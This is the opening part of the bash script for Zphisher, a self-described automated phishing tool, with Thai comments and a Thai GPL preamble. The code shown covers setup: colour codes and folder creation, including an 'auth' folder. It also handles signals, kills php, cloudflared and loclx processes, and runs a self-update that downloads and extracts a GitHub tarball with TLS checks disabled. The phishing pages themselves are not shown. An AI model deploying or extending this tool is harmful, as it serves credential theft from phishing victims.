#!/bin/bash

##   Zphisher         :         เครื่องมือฟิชชิ่งแบบอัตโนมัติ
##   ผู้พัฒนา        :         TAHMID RAYAT
##   เวอร์ชัน        :         2.3.5
##   Github         :         https://github.com/htr-tech/zphisher


##                   ใบอนุญาตสาธารณะทั่วไปของ GNU
##                    เวอร์ชัน 3, 29 มิถุนายน 2007
##
##    ลิขสิทธิ์ (C) 2007 มูลนิธิซอฟต์แวร์เสรี, Inc. <https://fsf.org/>
##    ทุกคนสามารถคัดลอกและแจกจ่ายสำเนาเอกสารใบอนุญาตนี้ได้ 
##    แต่ห้ามเปลี่ยนแปลงเนื้อหาใด ๆ
##
##                         บทนำ
##
##    ใบอนุญาตสาธารณะทั่วไปของ GNU เป็นใบอนุญาตแบบ copyleft
##    สำหรับซอฟต์แวร์และงานประเภทอื่น ๆ
##
##    ใบอนุญาตสำหรับซอฟต์แวร์ส่วนใหญ่และงานที่ใช้งานได้จริงอื่น ๆ
##    ได้รับการออกแบบมาเพื่อจำกัดเสรีภาพของคุณในการแบ่งปันและเปลี่ยนแปลงงาน
##    ในทางกลับกัน ใบอนุญาตสาธารณะทั่วไปของ GNU มีวัตถุประสงค์เพื่อรับประกันเสรีภาพของคุณ
##    ในการแบ่งปันและเปลี่ยนแปลงทุกเวอร์ชันของโปรแกรม เพื่อให้โปรแกรมนั้น
##    ยังคงเป็นซอฟต์แวร์เสรีสำหรับผู้ใช้ทุกคน เรา มูลนิธิซอฟต์แวร์เสรี
##    ใช้ใบอนุญาตสาธารณะทั่วไปของ GNU สำหรับซอฟต์แวร์ส่วนใหญ่ของเรา
##    ซึ่งจะนำไปใช้กับงานอื่นที่เผยแพร่ด้วยวิธีนี้โดยผู้เขียนของงานนั้น ๆ
##    คุณสามารถใช้ใบอนุญาตนี้กับโปรแกรมของคุณได้เช่นกัน
##
##    เมื่อเรากล่าวถึงซอฟต์แวร์เสรี เราหมายถึงเสรีภาพ ไม่ใช่ราคา
##    ใบอนุญาตทั่วไปของเราถูกออกแบบมาเพื่อให้แน่ใจว่าคุณ
##    มีเสรีภาพในการแจกจ่ายสำเนาของซอฟต์แวร์เสรี (และคิดค่าบริการถ้าคุณต้องการ)
##    คุณจะได้รับรหัสต้นฉบับหรือสามารถขอได้หากต้องการ
##    คุณสามารถเปลี่ยนแปลงซอฟต์แวร์หรือใช้บางส่วนในโปรแกรมใหม่ที่เสรี
##    และคุณจะรู้ว่าคุณสามารถทำสิ่งเหล่านี้ได้
##
##    เพื่อปกป้องสิทธิ์ของคุณ เราต้องป้องกันไม่ให้ผู้อื่นปฏิเสธสิทธิ์เหล่านี้ 
##    หรือขอให้คุณสละสิทธิ์ ดังนั้นคุณมีความรับผิดชอบบางประการ 
##    หากคุณแจกจ่ายสำเนาของซอฟต์แวร์ หรือหากคุณแก้ไข: คุณต้องเคารพเสรีภาพของผู้อื่น
##
##    ตัวอย่างเช่น หากคุณแจกจ่ายสำเนาของโปรแกรมดังกล่าว ไม่ว่าจะฟรีหรือมีค่าใช้จ่าย 
##    คุณต้องส่งต่อเสรีภาพเดียวกันที่คุณได้รับให้แก่ผู้รับ 
##    คุณต้องทำให้แน่ใจว่าพวกเขาได้รับหรือสามารถเข้าถึงรหัสต้นฉบับได้
##    และคุณต้องแสดงข้อกำหนดเหล่านี้ให้พวกเขาทราบ เพื่อให้พวกเขาทราบถึงสิทธิ์ของตน
##
##    นักพัฒนาที่ใช้ GNU GPL ปกป้องสิทธิ์ของคุณด้วยสองขั้นตอน:
##    (1) ประกาศลิขสิทธิ์บนซอฟต์แวร์ และ (2) เสนอใบอนุญาตนี้
##    ที่ให้สิทธิ์ทางกฎหมายในการคัดลอก แจกจ่าย และ/หรือแก้ไขซอฟต์แวร์
##
##    เพื่อการปกป้องนักพัฒนาและผู้เขียน GPL อธิบายไว้อย่างชัดเจน
##    ว่าไม่มีการรับประกันใด ๆ สำหรับซอฟต์แวร์เสรีนี้
##    เพื่อประโยชน์ของผู้ใช้และผู้เขียน GPL ต้องการให้เวอร์ชันที่แก้ไข
##    ถูกทำเครื่องหมายว่าเปลี่ยนแปลง เพื่อที่ว่าปัญหาจะไม่ถูก
##    อ้างถึงผู้เขียนเวอร์ชันก่อนหน้าโดยผิดพลาด
##
##    เครือข่ายสังคมออนไลน์
##    1RaY-1 - https://github.com/1RaY-1
##    Aditya Shakya - https://github.com/adi1090x
##    Ali Milani Amin - https://github.com/AliMilani
##    Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##    Moises Tapia - https://github.com/MoisesTapia
##    Mr.Derek - https://github.com/E343IO
##    Mustakim Ahmed - https://github.com/bdhackers009
##    TheLinuxChoice - https://twitter.com/linux_choice



__version__="2.3.5"

## ค่าเริ่มต้นสำหรับโฮสต์และพอร์ต
HOST='127.0.0.1' # โฮสต์ที่ใช้ (ค่าเริ่มต้นคือ localhost)
PORT='8080'      # พอร์ตที่ใช้ (ค่าเริ่มต้นคือ 8080)

## ANSI สี (สำหรับข้อความและพื้นหลัง)
RED="$(printf '\033[31m')"  # สีแดง
GREEN="$(printf '\033[32m')"  # สีเขียว
ORANGE="$(printf '\033[33m')"  # สีส้ม
BLUE="$(printf '\033[34m')"  # สีน้ำเงิน
MAGENTA="$(printf '\033[35m')"  # สีม่วงแดง
CYAN="$(printf '\033[36m')"  # สีฟ้า
WHITE="$(printf '\033[37m')"  # สีขาว
BLACK="$(printf '\033[30m')"  # สีดำ

# สีพื้นหลัง
REDBG="$(printf '\033[41m')"  # พื้นหลังสีแดง
GREENBG="$(printf '\033[42m')"  # พื้นหลังสีเขียว
ORANGEBG="$(printf '\033[43m')"  # พื้นหลังสีส้ม
BLUEBG="$(printf '\033[44m')"  # พื้นหลังสีน้ำเงิน
MAGENTABG="$(printf '\033[45m')"  # พื้นหลังสีม่วงแดง
CYANBG="$(printf '\033[46m')"  # พื้นหลังสีฟ้า
WHITEBG="$(printf '\033[47m')"  # พื้นหลังสีขาว
BLACKBG="$(printf '\033[40m')"  # พื้นหลังสีดำ
RESETBG="$(printf '\e[0m\n')"  # รีเซ็ตสีพื้นหลังกลับเป็นค่าเริ่มต้น

## การตั้งค่าดาวน์โหลดและจัดการโฟลเดอร์
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")") # กำหนดตำแหน่งของโฟลเดอร์ฐาน

# ตรวจสอบว่าโฟลเดอร์ .server มีอยู่หรือไม่ หากไม่มีให้สร้างใหม่
if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
fi

# ตรวจสอบว่าโฟลเดอร์ auth มีอยู่หรือไม่ หากไม่มีให้สร้างใหม่
if [[ ! -d "auth" ]]; then
        mkdir -p "auth"
fi

# ตรวจสอบว่าโฟลเดอร์ .server/www มีอยู่หรือไม่ หากมีอยู่ให้ลบและสร้างใหม่
if [[ -d ".server/www" ]]; then
        rm -rf ".server/www"
        mkdir -p ".server/www"
else
        mkdir -p ".server/www"
fi

## ลบไฟล์ log ที่อาจมีอยู่ก่อนหน้า
if [[ -e ".server/.loclx" ]]; then
        rm -rf ".server/.loclx" # ลบไฟล์ .loclx หากมีอยู่
fi

if [[ -e ".server/.cld.log" ]]; then
        rm -rf ".server/.cld.log" # ลบไฟล์ .cld.log หากมีอยู่
fi


## การจัดการการหยุดการทำงานของสคริปต์
exit_on_signal_SIGINT() {
        # ฟังก์ชันที่ทำงานเมื่อกด Ctrl+C (SIGINT)
        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
        exit 0
}

exit_on_signal_SIGTERM() {
        # ฟังก์ชันที่ทำงานเมื่อได้รับสัญญาณ SIGTERM
        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
        exit 0
}

# ดักจับสัญญาณ SIGINT และ SIGTERM
trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## รีเซ็ตสีในเทอร์มินัลกลับเป็นค่าเริ่มต้น
reset_color() {
        tput sgr0   # รีเซ็ต attribute
        tput op     # รีเซ็ตสี
        return
}

## จัดการหยุดกระบวนการที่กำลังทำงานอยู่
kill_pid() {
        # รายชื่อโปรเซสที่ต้องการตรวจสอบและหยุด
        check_PID="php cloudflared loclx"
        for process in ${check_PID}; do
                if [[ $(pidof ${process}) ]]; then # ตรวจสอบว่าโปรเซสกำลังทำงานหรือไม่
                        killall ${process} > /dev/null 2>&1 # หยุดโปรเซส
                fi
        done
}

## ตรวจสอบว่ามีอัปเดตเวอร์ชันใหม่หรือไม่
check_update(){
        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
        relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest' # URL สำหรับตรวจสอบเวอร์ชันล่าสุด
        new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}') # ดึงข้อมูลเวอร์ชันใหม่
        tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz" # URL สำหรับไฟล์เวอร์ชันใหม่

        if [[ $new_version != $__version__ ]]; then
                # ถ้าพบว่าเวอร์ชันใหม่ไม่ตรงกับเวอร์ชันปัจจุบัน
                echo -ne "${ORANGE}update found\n"${WHITE}
                sleep 2
                echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
                pushd "$HOME" > /dev/null 2>&1 # เปลี่ยนไดเรกทอรีไปยังโฟลเดอร์ Home
                curl --silent --insecure --fail --retry-connrefused \
                --retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}" # ดาวน์โหลดไฟล์อัปเดต

                if [[ -e ".zphisher.tar.gz" ]]; then
                        # ตรวจสอบว่าไฟล์ดาวน์โหลดสำเร็จหรือไม่
                        tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1 # แตกไฟล์อัปเดต
                        [ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
                        rm -f .zphisher.tar.gz # ลบไฟล์ที่แตกเสร็จแล้ว
                        popd > /dev/null 2>&1 # กลับไปยังไดเรกทอรีก่อนหน้า
                        { sleep 3; clear; banner_small; }
                        echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
                        { reset_color ; exit 1; }
                else
                        # ถ้าเกิดข้อผิดพลาดระหว่างดาวน์โหลด
                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
                        { reset_color; exit 1; }
                fi
        else
                # ถ้าเวอร์ชันปัจจุบันเป็นล่าสุดแล้ว
                echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
        fi
}

## ตรวจสอบสถานะการเชื่อมต่ออินเทอร์เน็ต
check_status() {
        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
        timeout 3s curl -fIs "https://api.github.com" > /dev/null # ทดสอบการเชื่อมต่ออินเทอร์เน็ต
        [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}" # แสดงสถานะว่าออนไลน์หรือออฟไลน์
}